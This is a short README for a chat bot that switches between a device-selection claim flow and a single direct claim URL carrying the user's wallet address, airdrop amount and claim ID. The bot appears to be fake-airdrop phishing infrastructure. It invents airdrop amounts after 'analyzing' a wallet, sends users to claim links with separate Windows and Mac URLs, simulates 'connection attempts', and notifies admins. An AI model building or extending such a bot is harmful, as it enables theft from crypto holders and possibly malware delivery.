# URL Toggle Configuration

## Overview

The bot now supports two claim flow modes through environment configuration:

1. **Device Selection Flow** (Default) - Shows device selection buttons for iOS, Android, Mac, Windows
2. **Direct URL Flow** - Uses a single all-in-one URL with wallet parameters

## Configuration

### Environment Variables

Add these to your `.env` file:

```env
# Toggle between device selection flow (true) or direct URL (false)
USE_DEVICE_SELECTION=true

# Direct claim URL (used when USE_DEVICE_SELECTION=false)
ALL_IN_ONE_URL=https://claim.hunter.xyz/universal

# Device-specific URLs (used when USE_DEVICE_SELECTION=true)
CLAIM_URL=https://claim.hunter.xyz
WIN_MAC_URL=https://claim.hunter.xyz/desktop
```

### Mode Switching

#### Device Selection Mode (USE_DEVICE_SELECTION=true)
- Shows device selection interface
- Uses mobile/desktop specific URLs
- Supports animated connection attempts
- Provides device-optimized claiming experience

#### Direct URL Mode (USE_DEVICE_SELECTION=false)
- Single "Claim Airdrop" button opens direct URL
- Includes all parameters: wallet address, amount, project name, claim ID
- Simpler user experience
- No device selection required

## URL Parameters

When using direct URL mode, the following parameters are automatically added:

- `id`: Unique claim identifier
- `wallet`: User's wallet address
- `amount`: Airdrop amount in USD
- `project`: Project name (URL encoded)

Example generated URL:
```
https://claim.hunter.xyz/universal?id=AH123ABC&wallet=0x1234...&amount=15000&project=DeFi%20Rewards%20Program
```

## Implementation

The toggle affects:
- Claim keyboard generation in `keyboards/inlineKeyboards.js`
- Callback handling in `bot.js`
- Admin notifications remain consistent for both modes

## Testing

1. Set `USE_DEVICE_SELECTION=false` in your environment
2. Restart the bot
3. Analyze a wallet to generate airdrop
4. Click "Claim Airdrop" - should open direct URL instead of device selection

Switch back to `USE_DEVICE_SELECTION=true` to restore device selection flow.